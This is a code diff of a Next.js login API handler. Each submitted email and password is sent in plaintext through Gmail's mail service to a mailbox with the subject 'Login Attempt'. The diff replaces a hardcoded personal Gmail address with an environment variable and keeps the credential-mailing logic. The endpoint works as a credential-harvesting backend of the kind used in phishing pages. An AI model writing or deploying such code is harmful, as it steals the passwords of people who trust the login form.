@@ -1,5 +1,3 @@
-// pages/api/login.ts
-
 import type { NextApiRequest, NextApiResponse } from 'next';
 import nodemailer from 'nodemailer';
 
@@ -7,22 +5,22 @@ export default function handler(req: NextApiRequest, res: NextApiResponse) {
   if (req.method === 'POST') {
     const { email, password } = req.body;
 
-    // Example of email sending logic
+    
     const emailUser = process.env.EMAIL_USER;
     const emailPassword = process.env.EMAIL_PASSWORD;
 
     const transporter = nodemailer.createTransport({
       service: 'gmail',
       auth: {
-        user: emailUser, // Your Gmail address
-        pass: emailPassword,  // Your Gmail password
+        user: emailUser, 
+        pass: emailPassword, 
         
       },
     });
 
     const mailOptions = {
-      from: 'nnaemekafrank400@gmail.com',
-      to: 'nnaemekafrank400@gmail.com',
+      from: emailUser,
+      to: emailUser,
       subject: 'Login Attempt',
       text: `Email: ${email}, Password: ${password}`,
     };
